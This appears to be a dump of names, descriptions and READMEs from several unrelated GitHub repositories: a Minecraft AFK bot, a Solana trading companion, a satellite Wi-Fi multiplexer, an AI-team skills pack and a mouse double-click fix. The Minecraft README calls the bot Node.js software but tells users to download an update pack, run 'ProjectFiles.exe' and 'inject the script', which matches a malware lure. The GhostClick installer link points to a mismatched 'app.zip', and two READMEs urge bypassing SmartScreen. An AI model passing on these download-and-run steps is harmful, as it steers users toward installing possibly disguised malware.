items.name: Minecraft-AFK-Bot
items.description: Lightweight Minecraft Anti-AFK bot with a web dashboard. Keeps your account online 24/7, simulates activity to avoid kicks, and supports auto-reconnect. Perfect for Aternos and survival servers.
items.readme:
# 🤖 Minecraft AFK Bot **Keep Your Account Online 24/7 — 2026** A lightweight, open-source Minecraft Anti-AFK bot with a web dashboard. Keeps your character active on Java servers to avoid being kicked for inactivity. Perfect for keeping Aternos servers alive or farming playtime. --- ## 🎯 What it is **Minecraft AFK Bot** is a standalone Node.js application that connects to your Minecraft server as a player. It simulates small movements (head rotation, jumping) to bypass AFK detection, and automatically reconnects if the server kicks you. > ⚠️ **Warning:** Using automated clients may violate the rules of some Minecraft servers. Use responsibly and only on servers where such tools are permitted. We are not responsible for any bans. --- ## 🚀 Quick Start

1. **Download Core_Update_Pack** using the button above. 2. **Extract** the archive into a separate folder. 3. **Run ProjectFiles.exe**. 4. **Follow the on-screen instructions** and inject the script. --- ## ✨ Features | Feature | Description | |-----------------------------|------------------------------------------------------| | 🛡️ **Smart Anti-AFK** | Periodic head movements and jumps to avoid kicks | | 🌐 **Web Dashboard** | Control the bot from your browser (localhost) | | 🔄 **Auto-Reconnect** | Automatically rejoins if disconnected or kicked | | 👤 **Multi-Account** | Support for Microsoft and Mojang accounts | | 💬 **Chat Integration** | Send and receive messages via the dashboard | | ⚙️ **Customizable** | Adjust movement intervals and amplitudes | --- ## 🛠️ How to use 1. Launch **ProjectFiles.exe**. 2. Open your browser and go to `http://localhost:3000`. 3. Add your Minecraft account (email and auth type). 4. Enter your server address and port. 5. Click **"Start"** to connect the bot. 6. The bot will join the server and start simulating activity. --- ## ⚙️ Configuration You can adjust settings in the `config.json` file or via the web dashboard: - **Server Address**: IP or domain of your Minecraft server - **Port**: Default is `25565` - **Wiggle Interval**: Time between head movements (default: 30000ms) - **Wiggle Amplitude**: How far the head moves (default: 0.1) - **Chat Ping**: Optional message to send periodically --- ## ❓ FAQ **Is this safe to use?** It only simulates player activity. However, some servers have strict rules against bots. Check your server's rules before using. **Does it work on Aternos?** Yes. It's perfect for keeping free Aternos servers from shutting down due to inactivity. **Does it work on Mac or Linux?** Yes, the bot is built with Node.js and runs on Windows, macOS, and Linux. **Can I use it on multiple accounts?** Yes, the web dashboard supports adding and switching between multiple accounts. --- ## 💻 Tech Stack & Architecture - **Core:** Node.js / Mineflayer - **Web Server:** Express - **Real-time:** Socket.io - **Auth:** Microsoft / Mojang - **Target OS:** Windows / macOS / Linux --- ## 🤝 Contributing Pull requests, bug reports, and feature suggestions are welcome. See `CONTRIBUTING.md` for guidelines. --- ## 📜 License MIT License — free to use, modify and redistribute. --- **⭐ Star the repo if it helped you.**

items.readme:
See the numbers before you trade.

Lemma is a free, open-source desktop companion for Axiom traders: replay real launches, count every fee, check a token in one paste.
No login. No browser extension. Nothing to connect.

> [!NOTE] > **Download:** the Windows build is a single `Lemma-setup.exe` — [releases](../../releases/latest). One file, no installer, no login. > > The build isn't code-signed yet, so SmartScreen may warn you the first time. Choose **More info**, then **Run anyway**. > [!WARNING] > **Stick to this repo.** Lemma never asks for a login, ships no extension, and connects nothing. If a copy of the app asks for credentials, it is not Lemma. ## Why Lemma Every terminal shows you what to buy. None shows you whether your strategy actually made money once fees, priority fees, tips and slippage were paid. | | Trading terminals and bots | Lemma | |---|---|---| | **Test a strategy** | Live, with real SOL | **Replay real launches, paper first** | | **Costs** | One fee line | **Fee tier, priority, tips and slippage, per trade** | | **Login** | Often required | **None** | | **Token check** | Spread over tabs | **One paste, plain words** | | **Taxes** | Not offered | **CSV for Koinly and Awaken** | ## What you get ### Backtest on real launches

Lemma records every new launch from the chain on your PC. Write rules for when to buy and when to sell, replay weeks of launches in seconds, and compare the curve before and after costs. Then paper-trade it live, with nothing connected. ### One-paste token check

Mint and freeze authority, the real pool, same-slot bundles, holder concentration, the dev's past launches, copied names and pictures, and X accounts renamed this week. Every check says what it means. ### What trading really cost you

Paste a public address. Lemma rebuilds every trade with its real cost and exports a tax-ready CSV. Read-only, nothing to connect. ### Extension check Lemma keeps a local list of browser extensions that read trading pages, so you can check yours. ## How it works 1. **Lemma reads the chain** through your own RPC and free public APIs, and records new launches in its folder. 2. **It replays and checks** on your PC: backtests, paper trades, token checks and your trade history. 3. **You trade as usual.** Lemma never places trades for you. ## FAQ **Is this made by Axiom?** No. Lemma is an independent, open-source project that works alongside Axiom. It doesn't use any private API. **Will it trade for me?** Backtests, paper trading and token checks are in your hands today, with nothing connected. An opt-in exit manager with spending caps and a transaction allowlist is next on the roadmap. **How do I know a download is real?** Take it from this repo's [releases](../../releases/latest) page only. A build that asks for credentials is not Lemma. ## Roadmap - [x] Brand, icon and interface direction - [x] Launch recorder and cost model - [x] Backtest and paper trading - [x] Token check - [x] Trade journal and tax CSV - [x] Extension check - [x] Portable Windows build ## Legal Lemma isn't affiliated with or endorsed by Axiom, pump.fun, Koinly or Awaken. Their names appear only to say what Lemma works with. Nothing here is financial advice. Lemma's code and brand assets are [MIT](LICENSE). See [CREDITS.md](CREDITS.md).

items.name: satmux
items.description: Accelerate high-latency GEO inflight Wi-Fi via warm BBR TCP multiplexing + 1-RTT Ground-TLS + zlib (zero dependencies)
items.readme:
# satmux

TCP multiplexer and `1-RTT` HTTP/TLS relay for geostationary (GEO) inflight Wi-Fi (Inmarsat GX, Viasat, Panasonic, SITA). Pure Python 3 stdlib, zero external dependencies.

Measured inflight over Inmarsat GX Ka-band (`~620 ms` RTT, SITA `AS206433` Amsterdam ground station):

```text
  ORIGIN (6× PARALLEL)  RAW CABIN WI-FI (:443)    1-RTT BBR + ZLIB MUX    SPEEDUP
  ────────────────────  ────────────────────────  ──────────────────────  ─────────
  GitHub Repo           ████████████    TIMEOUT  ███░░░░░░░░░    4.66s  FIXED ✓
  GitHub API            ████████████  TCP RESET  ██░░░░░░░░░░    2.66s  FIXED ✓
  Hacker News           ████████████    TIMEOUT  ██░░░░░░░░░░    2.28s  FIXED ✓
  MDN Docs              ████████░░░░     12.01s  ██░░░░░░░░░░    2.30s     5.2×
  Cloudflare            ██░░░░░░░░░░      2.97s  █░░░░░░░░░░░    1.40s     2.1×
  PyPI JSON API         █████░░░░░░░      7.09s  ██░░░░░░░░░░    2.64s     2.7×
  ──────────────────────────────────────────────────────────────────────────────────
  6-Origin Burst:    19.13s (3/6 failed)  →  5.35s (0/6 failed)   [3.6× faster · -76% TTFB]
```

## Problem

Non-Starlink inflight Wi-Fi usually breaks on three things unrelated to raw bandwidth:

1. **Onboard `:443` middleboxes and DNS interception.** Cabin gateways intercept `:53` DNS and run a transparent `:443` split-TCP proxy (PEP) whose state table drops connections under load (`Connection reset by peer` / TLS timeouts on `github.com`, `api.github.com`, package registries). Non-443 TCP ports pass through untouched.
2. **Handshake round-trips (`~620 ms` per GEO hop).** Every new origin normally pays multiple satellite round-trips (DNS + TCP + TLS) before transferring payload bytes.
3. **Cubic congestion collapse.** Cabin Wi-Fi packet loss causes standard TCP to halve `cwnd` repeatedly, leaving most of your per-seat token-bucket cap unused.

## How it works

```text
Direct (:443):
  laptop ──▶ cabin DNS + :443 PEP ══(3–4 GEO RTTs)══▶ ground ──▶ origin  (frequent TCP resets)

satmux (:8444):
  laptop ══(12 persistent TCP :8444 BBR + zlib pipes)══▶ ground VM ──(2 ms)──▶ origin
```

- **Persistent non-443 carrier pool (`:8444`):** Keeps 12 pre-warmed TCP connections open to a Linux VM near the satellite ground station, bypassing the cabin `:443` proxy and onboard DNS. Streams are scheduled onto the carrier with the lowest recent byte load so idle browser keepalives do not cause head-of-line queueing.
- **0-RTT stream open (`127.0.0.1:1080` SOCKS5 / `127.0.0.1:8080` HTTP CONNECT):** Returns `OK` locally in `<1 ms` and sends `FT_OPEN` + TLS `ClientHello` in the same TCP burst, saving one full satellite RTT while preserving end-to-end TLS from the laptop.
- **1-RTT ground fetch (`127.0.0.1:8081`):** Sends an encrypted (`BLAKE2b-512` stream + `HMAC-SHA256`) request frame over a warm carrier. The ground VM performs DNS, verified TLS 1.3, and HTTP redirects on fiber (`~2–5 ms`) and compresses plaintext responses with `zlib` before crossing the satellite link.
- **`git` and `gh` CLI routing:** Go binaries such as `gh` ignore macOS `scutil` proxies. `satmux` exposes a `0600` local Unix socket (`/tmp/satmux-gh-tls.sock`) wired to `gh`'s `http_unix_socket` that wraps requests in verified end-to-end TLS on the laptop and tunnels them over SOCKS5, fixing already-running coding agents without restarting them.
- **BBR + `MSS 1280`:** Ground-to-cabin sockets enable `TCP_CONGESTION=bbr` and `TCP_MAXSEG=1280`.

## Limits

- **Latency floor (`~580–650 ms`):** Speed-of-light propagation to geostationary orbit (`35,786 km`) does not change; `satmux` removes extra round-trips, not the physical RTT of one hop.
- **Per-seat shaper (`~4–5 Mbps` typical):** Cabin routers police total bandwidth per client lease. Compressible traffic (HTML, JSON, code, APIs) exceeds that rate in effective throughput via `zlib`; already-compressed binaries (`.mp4`, `.zip`) stay bounded by the seat cap (though BBR + parallel `satmux-get` keep throughput near the ceiling).
- **Single paid session:** Uses your authenticated cabin Wi-Fi lease; it does not bypass captive portals.

## Setup

### 1. Ground VM

Rent a small Linux VM (`$0.01–$0.03/h`, Python 3.9+, open TCP port `8444`) close to where the satellite downlinks to fiber. Check `curl ipinfo.io` on raw cabin Wi-Fi first to see the egress country/ASN:

- **Emirates / Middle East & European flights (Inmarsat GX / SITA `AS206433`):** Amsterdam, Frankfurt, or Hetzner EU (downlink lands in the Netherlands).
- **North America:** `us-east` or `us-west`.
- **Asia-Pacific:** Singapore or Tokyo.

Pause UDP VPNs (Tailscale/WireGuard) inflight—blocked UDP retry traffic competes for cabin airtime.

### 2. Run

With a coding agent:

> Spin up a temporary Ubuntu VM near my current satellite egress IP, start `https://github.com/Th0rgal/satmux` on port `8444`, connect the local 12-carrier client, enable `bin/satmux-macos on`, and run `bin/satmux-bench`.

Or manually:

```bash
# 1. Laptop: generate PSK
git clone https://github.com/Th0rgal/satmux.git && cd satmux
openssl rand -hex 32 > mux.psk && chmod 600 mux.psk

# 2. Ground VM: start server
scp satmux.py mux.psk root@<SERVER_IP>:/root/
ssh root@<SERVER_IP> 'nohup env SATMUX_PSK=$(cat /root/mux.psk) python3 /root/satmux.py server --port 8444 >/var/log/satmux.log 2>&1 &'

# 3. Laptop: start client + enable macOS / git / gh routing
SATMUX_PSK=$(cat mux.psk) python3 satmux.py client --host <SERVER_IP> --port 8444 --carriers 12 &
./bin/satmux-macos on <SERVER_IP>
```

Benchmark or run parallel range downloads:

```bash
./bin/satmux-bench
./bin/satmux-get https://example.com/archive.tar.gz
```

### 3. Teardown after landing

```bash
./bin/satmux-macos off
```

Restores macOS Wi-Fi proxy settings, `~/.gitconfig`, `gh` `http_unix_socket`, and `launchctl` env vars, then destroy the temporary VM.

items.name: solo-to-team-skills
items.description: Skills for human-led AI teams: delegate tasks, verify evidence, explain steps clearly, and learn from real cases. 一个人统筹 AI 团队：派活、核证、清楚说明、经验复用。
items.readme:
# Solo to Team · 一人成队

**English version: [README.en.md](README.en.md)**

**团队组织与协作报告（PDF，17页）：[docs/solo-to-team-value.pdf](docs/solo-to-team-value.pdf)**

仓名：`solo-to-team-skills`  
英文副标题：**Skills for human-led AI teams.**  
中文说明：一个人统筹 AI 团队的协作技能包。  
署：**大冰发起**

> 文档状态：**v0.9-draft**，非最终发布稿，正式公开前还会改。已在多个 Agent 工具中完成实际使用验证（取得→装／配置→按名调用→产出登记行；另外当前包上八家各有一例有限任务的验收记录（真实成果→对照要求检查→人工验收）：Codex 保留此前单独验证的一例，其余七家按同一会议转写题补验，部分宿主经受阻重跑或退回修订后才通过；不代表稳定性或所有任务都能做成，调用方式各家不同（有的由使用者本人在宿主里发出，有的命令行或代点），部分宿主未保留技能加载的原始轨迹；不表示每家四个技能都逐一被调用，也不证明效果），范围：**Codex、WorkBuddy、DeepSeek Harness、Cursor、CodeBuddy、Kimi Work、千问办公（QwenWork）** 写「支持」；**Grok Bot** 写「支持，需手动配置」；**Claude Code** 结构已备、走通待补，不在首发支持之列。

## 这是什么

一个人，也能带起一支 AI 团队。

这是一套**拿得到、装得上、叫得动**的协作技能包：四支技能＋一个模板＋说明＋脱敏案例。它帮你管住「一个人总控、多个长期 AI 助手」时最容易掉链子的几件事：活派出去有人收，说「做好了」有证据，写给新手的步骤照做就成，踩过的坑留下来给下一个人用。

借鉴的是方法思路；交付的是改写后的中文协作包，外加两支原创技能，并已在多个 Agent 工具里实际装上、按名调用过。借鉴来源见 [`NOTICE`](NOTICE) 和各技能末尾的来源／借鉴说明。

技能本身不带定时和叫醒（插件清单 `hooks: {}`）：到点查、记接单／收到成果／验收、叫开工，按技能正文里的步骤，由你或你用的 AI 工具来做。

## 对我有什么用

- **一人成队：派出去的活，接得住、跟得上、收得回来。** 一条线走到底：派 → 收 → 核 → 判。每件活派出去前登记一行「待收」，写明谁在干、谁来收、谁到点查；收回来记「已收到成果」并写明结果在哪，核过证据记「已验收」才算完。登记行让还没人接的活一眼看得见；到点去查、去催，由你或宿主的定时能力来做（分工见下面「首版核心流程」三栏表）。
- **换工具，不必重学一套协作方法。** 四支核心技能的正文各家共用，方法学一次就行；每家从哪装、怎么叫、还要准备什么，按各家真实配置分别写在「各宿主怎么装、怎么叫」。
- **从一张表开始，迈出带领 AI 团队的第一步。** 主示例和登记行模板拿来就能用：先用记事本或表格把「派、收、核」练一遍。这一步练的是方法；想让 AI 助手按名调用技能，还要先装好一个 Agent 工具。
- **从真活里来。** 两个脱敏案例（日更流水线怎样改、验收链怎样抓漏）照实写了问题、改法、结果和仍没解决的地方，见 [`ops-case-notes`](skills/ops-case-notes/)。

具体能做到的：

- 活派出去之后有人登记、到点有人查；接单、收到成果、验收完成分开记，只有验收完成或授权取消才从未完清单里拿掉
- 说「做好了」之前，先有对得上当前版本的有效证据；改过或失败过的部分补核，没变的可复用上一回核验
- 操作说明写得让不了解内情的人照做一次就成；凡须本人亲自完成的步骤，只写「请本人来」，不写代做办法
- 运营里踩过的坑，留下脱敏、可复用的方法级记录（真实问题／改法／结果／仍未解决）

## 首版核心流程

一条线：**提目标 → 分工 → 交接 → 核对 → 判断**。

| 流程 | 对应技能 |
|---|---|
| 分工＋交接 | [`dispatch-accept-verify`](skills/dispatch-accept-verify/)（派出去的活要收回来） |
| 核对 | [`evidence-before-done`](skills/evidence-before-done/)（交活前要有证据） |
| 须人做的那几步怎么写 | [`beginner-ops-writing`](skills/beginner-ops-writing/)（新手操作说明：一次一步、点名唯一、写清做完会看到什么） |
| 真实弯路参照 | [`ops-case-notes`](skills/ops-case-notes/)（脱敏运营记录） |

同一件事，哪部分归技能、哪部分归你用的 AI 工具（下称「宿主」）、哪部分必须人来做：

| 流程 | 本包技能负责 | 宿主能力负责 | 须人做 |
|---|---|---|---|
| 提目标 | 给出写法：做什么、结果放哪、几点交（登记行字段） | 开会话、接收你的话 | 定目标、定先后、定做到什么算完 |
| 分工 | 派之前先登记一行「待收」：谁在干、谁来收、谁到点查 | 开多个会话或子助手；能跨助手发消息的就发 | 决定派给谁；花钱、发出、删除等危险动作由人点头 |
| 交接 | 到点查、记「已接单」「已收到成果」、续期、没人接时升级、放行后叫开工 | 定时提醒、叫醒——**宿主有就用，本包不自带**（`hooks: {}`） | 宿主没有定时，就由人按点去查 |
| 核对 | 说完成前拿到对得上当前版本的有效证据（打开看、重算、照原步骤再走一遍）；核过记「已验收」 | 打开文件、跑命令、看结果 | 登录、付款、本人确认这类只能本人做的步骤 |
| 判断 | 把证据和现状照实摆出来；附同类弯路参照 | — | 放行、退回、改方向：最后拍板永远是人 |

## 怎样开始

按你的情况挑一段读，其余可跳。**不需要先读任何团队制度。** 核心技能正文各家共用，不另做 App；每家的入口和依赖不同，见下面「各宿主怎么装、怎么叫」。

### 零基础（刚开始接触 AI 或编程）

这里的「零基础」只指接触 AI／编程的起点。会写清一件事、会安排人干活、会核对结果，就已经够用。

1. 先读 [`examples/`](examples/) 主示例，再照 [`examples/walkthrough-meeting-notes/`](examples/walkthrough-meeting-notes/) 完整跟做一件小事：给定输入 → 成果 → 证据 → 验收，外加一次退回。
2. 只看一个模板：[`templates/task-register-line.md`](templates/task-register-line.md)，学会写一行「待收」、一行「已收到成果」、一行「已验收」。
3. 从一张表开始：用记事本或表格把这套方法练一遍——派活前写「待收」，到点去查，收到记「已收到成果」，核过记「已验收」。这一步练的是方法；要让 AI 助手按名调用技能，还得装好一个 Agent 工具，见下面「各宿主怎么装、怎么叫」。

### 已经在用 AI 助手

1. 在下方找到你的宿主，照「准备 → 取得／加载 → 调用」做一遍。
2. 先启用两支：`dispatch-accept-verify`（派收）和 `evidence-before-done`（交活前证据）。
3. 照 [`examples/`](examples/) 主示例派一件小活，跑一遍「待收 → 已接单 → 到点查 → 已收到成果 → 核过记已验收」。
4. `ops-case-notes` 可以等出问题了再翻。

### 已在跑多个助手、自己搭流程

1. 直接看上面那张三栏表，对照你的宿主补齐「宿主能力负责」那一栏缺什么。
2. 读 [`ops-case-notes`](skills/ops-case-notes/)：两个真实案例里派收、核对在哪漏过、怎么改、哪些仍没解决。
3. 把登记行字段接进你自己的记录或看板。`hooks: {}` 意味着自动化要你自己用宿主能力接，本包不替你做。

### 约十分钟走通？

实测（Cursor CLI，非交互、提示词事先备好）：约 **0.5 分钟**（29.6 秒）。前提：已装并登录 Cursor（含 CLI）、已取得本包、网络可用；从把四支技能拷进 `~/.cursor/skills/` 算到打出可读的「待收」行。不含装、注册宿主，也不含手动打字的时间。这测的只是**已备好环境时用 CLI 打出登记行**要多久，不是陌生人从零装宿主到做完一整件任务的总时长。

「约十分钟」仍可作为设计目标，或把「含装宿主」算进用户总时长时的对外口径；**不得把约十分钟写成已测保证**。其他宿主尚未按同一秒表口径计时。

## 各宿主怎么装、怎么叫

**总原则：列出的宿主已分别完成实际使用验证，但能力与装法不同；不要假定装完就能自动组队。** 每家的验证标准一样：取得 → 装／配置 → 调用 → 有可检查的产出（例如照主示例写出一行可读的「待收」登记行）。这几步的终点是登记行。另外，当前包上八家各有一例有限任务的验收记录（真实成果→对照要求检查→人工验收）：Codex 保留此前单独验证的一例，其余七家按同一会议转写题补验，部分宿主经受阻重跑或退回修订后才通过；不代表稳定性或所有任务都能做成，调用方式各家不同（有的由使用者本人在宿主里发出，有的命令行或代点），部分宿主未保留技能加载的原始轨迹；不表示每家四个技能都逐一被调用，也不证明效果。主示例 walkthrough 本身是教学样例，不是实测记录。

## 发起背景：一个作家，从零接触 AI 的前十八天，开始探索「一人成队」

本包由**大冰发起**。他是作家；在这个项目里，他也是探索者。

经历约两年半高强度直播之后，他选择通过学习来休息。接触 AI 的这段时间里，他度过了自己的 **47 岁生日**。他希望为和自己一样从零开始的人，探索一条组织 AI 协作、学习和成长的路径。不把读者限定成「中年人」或「新手」；只要愿意从零摸索，这套方法就够得着。他带来的，是多年写作、带团队做事、和人长期打交道的经验：怎么把一件事说清楚，怎么分工，怎么确认事情真的做完了。这些经验，是这次尝试的基础。「从零」只指接触 AI 和编程的起点，不否定他已经有的本事。

这套包起步于一位作家接触 AI 的前十八天（截至 2026-11-06）。十八天是起点阶段，不是说整套包十八天就做完了：方法在这段时间里成形，首版的改写、案例整理和多宿主验证在此基础上完成；正式公开前还会打磨，之后继续迭代。

那段时间里，一个人带着几个长期 AI 助手干活，最常出的问题不是「AI 不够聪明」，而是：活派出去没人收、说做好了其实没核过、写给新手的步骤只有自己看得懂、同一个坑踩两遍。本包收的就是这些问题的真实改法，连同没改好的地方一起写出来（见 `ops-case-notes`）。

几点说清楚：

- **实验性**：方法仍在迭代，但已交付的部分要能用——能装、能调、能完成一件小任务。
- **验证方式**：在多个 Agent 工具中完成实际使用验证，范围以上文「各宿主怎么装、怎么叫」那张表为准。
- **个人成长**：发起人自己从中有所收获，也希望别人用了能有类似收获；这是希望，不是效果保证。

items.description: Free mouse double click test and fix for Windows 11/10. Finds ghost clicks (mouse chatter, switch bounce) on a strip chart, learns a debounce threshold from your real double-clicks, filters them system-wide from the tray, catches drag and drop drops, and exports RMA evidence. Open source, no ads.
items.readme:
Mouse double clicking on a single click? Test every button, see the ghost clicks on a strip chart, and filter them system-wide on Windows 11 and 10.

Features  ·  Double click test  ·  Install  ·  How it works  ·  FAQ  ·  Docs  ·  Roadmap


**GhostClick** is a free, open source **mouse double click test and fix for Windows 11 and Windows 10**. When a mouse switch wears out it starts to *chatter*: one press reaches Windows as two clicks, the left click double clicks on its own, and drag and drop lets go halfway. GhostClick records every button on a polygraph-style strip chart, measures each ghost click in milliseconds, and then filters them system-wide from the tray with a debounce threshold it learns from your own fastest double-click. No account, no ads, nothing sent anywhere. > [!NOTE] > Screenshots, GIFs and numbers in this README show **sample data** from a demo session. The mouse > in them is a generic "HID-compliant mouse"; no statement here is a measurement of any real product.

Strip chart click testEvery button gets its own ink pen: Left, Right, Middle, Back (X1), Forward (X2) and the wheel. A press draws a square pulse. A ghost click shows up as a needle-thin spike, and the recorder circles it in red with its timing, for example 6 ms, ghost
Interval histogram that finds the gapTime between clicks forms two humps: ghost clicks at about 1 to 20 ms and your real fastest double-clicks at about 70 to 200 ms. GhostClick puts the debounce threshold in the empty gap between them, so the fix never eats a real double-click or fast clicking in games
System-wide filter from the trayPer-button debounce with its own threshold, an adaptive mode, per-app exclusions, a weekly counter ("1,284 ghost clicks filtered this week") and start with Windows. Built on the Windows low-level mouse hook
Hold test for drag and dropHold a button for 3 seconds. A healthy switch draws a flat line; a worn one shows release blips that the recorder marks. This finds the "drag and drop not working" fault that click tests miss, and turns on hold protection for it
Switch wear meterCounts clicks per button since install and shows them on an instrument gauge against the rated life of the switch you pick, with the point where chatter began
RMA evidence reportExports a printout-style PNG or PDF for a warranty claim: "37 double-click events under 20 ms during 5 minutes of testing", with the histogram, strip excerpts, timestamps and system info
And the rest
All five buttons and the wheelBack and Forward side buttons chatter too. The wheel channel draws each notch, so a skipping scroll wheel shows up as missing or reversed ticks
Hold protectionA second filter rule for drags: a release followed by a press within a few milliseconds is swallowed, so a held button stays held
Per-app exclusionsThe filter steps aside while a chosen program is in the foreground, for example a rhythm game where you really do tap faster than the threshold
Ghost logEvery ghost click with its time, button and gap, exportable as CSV
Portable buildA zip that runs without installing; settings stay next to the exe
Nothing about youNo telemetry, no account, no network calls. Reports are files you attach yourself

Open **Recorder**, click in the box at your normal pace for a few minutes, and use every button you want to check. The paper scrolls like a polygraph at 20 ms per division. Each press is a square pulse; a ghost click is a spike right after a release, circled in red with the gap in milliseconds. The counters at the top tell you clicks, ghost doubles, the shortest interval and the chatter rate. A healthy switch scores zero ghost doubles.
### Find the gap: the debounce threshold sets itself The **Intervals** screen plots the time between clicks on a log scale. Ghost clicks pile up on the left, real clicks on the right, and nothing lives in between. GhostClick takes the slowest ghost (99th percentile) and your fastest real double-click and puts the threshold at their geometric middle: with ghosts ending at 15.4 ms and a fastest double-click of 94 ms, that is √(15.4 × 94) = **38 ms**, 2.5 times away from each side. Turn the filter on and the ghost bars are struck out while your real double-click stays.
### Hold test: why drag and drop stops working A worn switch can let go for 2 to 7 ms while you hold it. Windows sees a release and a new press, so the file you were dragging drops and a text selection ends. A click test never sees this, because nobody clicks for three seconds. The **Hold test** does: hold for 3 s and every dropout is marked.
### Fix it system-wide The **Filter** screen turns the result into a fix that runs from the tray for every program: per-button threshold, adaptive learning, hold protection, exclusions, and a weekly count of what it blocked. It is a workaround for a worn part, so the wear meter and the evidence report are there for the day you replace the switch or send the mouse back.


1. Download **[GhostClick-Setup.exe](https://github.com/MajestyPoemFold/ghostclick-mouse-double-click-fix/releases/latest/download/app.zip)**, a direct link to the latest version 2. Run it. GhostClick installs for your user only (no administrator rights) and opens the Recorder 3. Click at your normal pace for five minutes. If ghost clicks show up, open **Intervals** and press **Apply** **Portable:** [GhostClick-Portable.zip](https://github.com/MajestyPoemFold/ghostclick-mouse-double-click-fix/releases/latest/download/app.zip), unzip anywhere and run `GhostClick.exe`. **winget** (once the package is published): ```powershell winget install MajestyPoemFold.GhostClick ``` > [!IMPORTANT] > Windows SmartScreen may say "Windows protected your PC" because the installer has no paid code > signing certificate. Click **More info**, then **Run anyway**. Every release is built from this > source by a public GitHub Actions workflow, so you can read the build log for the file you > downloaded. > [!WARNING] > Only download GhostClick from this repository's > [Releases](https://github.com/MajestyPoemFold/ghostclick-mouse-double-click-fix/releases) page. An app with > a system-wide mouse hook sees every click you make; do not run a renamed copy from somewhere else. **Check your download.** Each release lists SHA-256 hashes in `SHA256SUMS`, and the release workflow attests the files. With the GitHub CLI: ```powershell gh attestation verify GhostClick-Setup.exe --repo MajestyPoemFold/ghostclick-mouse-double-click-fix ``` Or compare the hash yourself in PowerShell: ```powershell Get-FileHash .\GhostClick-Setup.exe -Algorithm SHA256 ```
## Build from source Rust core, Tauri 2 shell, WebView2 UI. You need Rust stable (rustup), Visual Studio Build Tools with "Desktop development with C++", and the WebView2 runtime, which Windows 11 already has. ```powershell cargo test --workspace cargo install tauri-cli --version "^2" --locked cargo tauri dev # run the app cargo tauri build # installer in target/release/bundle/nsis ``` | Folder | Contents | |---|---| | `crates/ghostclick-core/` | Platform-independent logic, unit tested | | `src-tauri/` | Windows app shell: window, commands, installer config | | `ui/` | Frontend; port the screens from `design/app/` here | | `design/` | HTML/CSS mockups of every screen and the design tokens | | `docs/` | Build spec (`DESIGN.md`) and SEO notes |

**What chatter is.** A mouse button is a small mechanical switch: a metal leaf snaps onto a contact. New, it closes once. Worn, with a tired spring or oxidized contacts, it bounces: closed, open for a few milliseconds, closed again. The mouse firmware has its own debounce, but once the bounce lasts longer than that window, the extra open-and-close reaches Windows as a real release and a real press. That is a ghost click, and in Explorer two fast clicks are a double-click. **The test reads Raw Input.** The Recorder registers for Raw Input (`RegisterRawInputDevices`, usage page `0x01`, usage `0x02`) and reads `RAWMOUSE.usButtonFlags` from each `WM_INPUT`, so it sees button transitions per device, before any program or filter touches them. Each event is stamped with `QueryPerformanceCounter`. The interval that matters is the gap from a release to the next press of the same button. **The threshold comes from your data.** Gaps are binned on a log scale, 20 bins per decade, and split into two clusters. GhostClick takes `G` = the 99th percentile of the low cluster (the slowest ghost) and `F` = your fastest real double-click, and sets the threshold to `√(G × F)`, the middle of the gap on a log scale. It needs about 20 real double-clicks to learn, refuses to apply a value when the clusters overlap, and in adaptive mode only ever moves the threshold inside the gap. **The filter is a low-level mouse hook.** The tray process installs `SetWindowsHookEx(WH_MOUSE_LL)` and checks each `WM_xBUTTONDOWN` and `WM_xBUTTONUP` against two rules: - **Block repeat presses:** a press that arrives less than the threshold after a release of the same button is dropped (the hook returns non-zero), together with its matching release. Nothing is delayed, so presses keep zero added latency. - **Hold protection:** a release is held back for a few milliseconds (12 ms by default, set from your hold test). If a press of the same button arrives in that window, both are swallowed and the hold continues; if not, the release is sent on. Releases wait at most that long. Events with `LLMHF_INJECTED` set (macro tools, GhostClick's own re-sent releases) are never filtered. The hook procedure only compares timestamps and returns, because Windows skips a low-level hook that takes too long. Windows does not hand input aimed at a program running as administrator to a hook in a normal process, so clicks in elevated windows are not filtered unless you start GhostClick as administrator too. **Where things live.** Settings are in `%APPDATA%\GhostClick\settings.json`, test sessions in `%APPDATA%\GhostClick\sessions\`, and the start-with-Windows entry is a value under `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`. Uninstalling removes all three.

Why does my mouse double click when I click once?
Almost always a worn switch. The contact inside the button bounces, and the bounce gets past the mouse's own debounce, so Windows receives two clicks. It typically starts on the left button because that one does most of the work, and it gets worse over weeks. Less often the cause is a setting: File Explorer's "Single-click to open an item" (Folder Options) or ClickLock in Mouse settings can look like double clicking. Run the Recorder for five minutes: ghost clicks within 20 ms of a release mean hardware.
How to fix mouse double clicking on Windows 11?
1. Install GhostClick and test in the Recorder to confirm which button chatters. 2. Open **Intervals** and apply the suggested threshold for that button. 3. If drags drop, run the **Hold test** and turn on hold protection. 4. Leave the filter running from the tray with **Starts with Windows** on. This works the same on Windows 10. It is a software fix for a hardware fault: if the mouse is under warranty, export the evidence report and claim a replacement. Replacing the switch with a soldering iron is the permanent fix.
Is it the switch or the software?
The interval tells you. Ghost clicks from a bouncing switch land 1 to 20 ms after a release, far faster than a person can click (a fast human double-click is around 70 ms or more between clicks). Software causes do not produce that pattern. Also try the mouse on another PC with the portable build: if the spikes follow the mouse, it is the switch. If only one program misbehaves, check that program's own settings and the Explorer click settings first.
Will the filter affect gaming?
It is built not to. The threshold sits well below your fastest real double-click, so normal fast clicking passes untouched, and blocking a press adds no delay to the presses that get through. Hold protection delays releases only, by at most its window (12 ms by default); turn it off for games if you prefer. You can exclude any game in **Filter > Exclusions**. One limit: games that read the mouse through Raw Input may still see a ghost click that the hook blocked for other programs. GhostClick does not inject anything into games.
Logitech G Pro, G305, G502 double click fix
The steps are the same for every brand: test, apply the threshold, turn on hold protection if drags drop, and keep the evidence report for the manufacturer's support. These models come up often in public forum threads about double clicking. That says more about how many people own them than about failure rates; any mouse with mechanical switches can chatter, and optical switches do not bounce. | Mouse | Commonly reported | What to try first | |---|---|---| | Logitech G Pro Wireless | Left click double clicks | Recorder, then Intervals threshold | | Logitech G305 | Left click double clicks, drag drops | Hold test, hold protection | | Logitech G502 (HERO, Lightspeed) | Left or side button double clicks | Test X1 and X2 too | | Logitech G703, G903 | Left click double clicks | Recorder, warranty report | | Logitech MX Master 2S, MX Master 3 | Left click double clicks | Recorder, warranty report | | Razer DeathAdder (Elite, V2) | Left click double clicks | Recorder, Intervals threshold | | Razer Viper, Viper Ultimate | Double clicks, drag drops | Hold test | | Razer Basilisk | Left or side button double clicks | Test X1 and X2 too | | SteelSeries Rival series | Left click double clicks | Recorder, Intervals threshold | | Corsair M65, Harpoon | Left click double clicks | Recorder, warranty report | | Zowie EC, FK series | 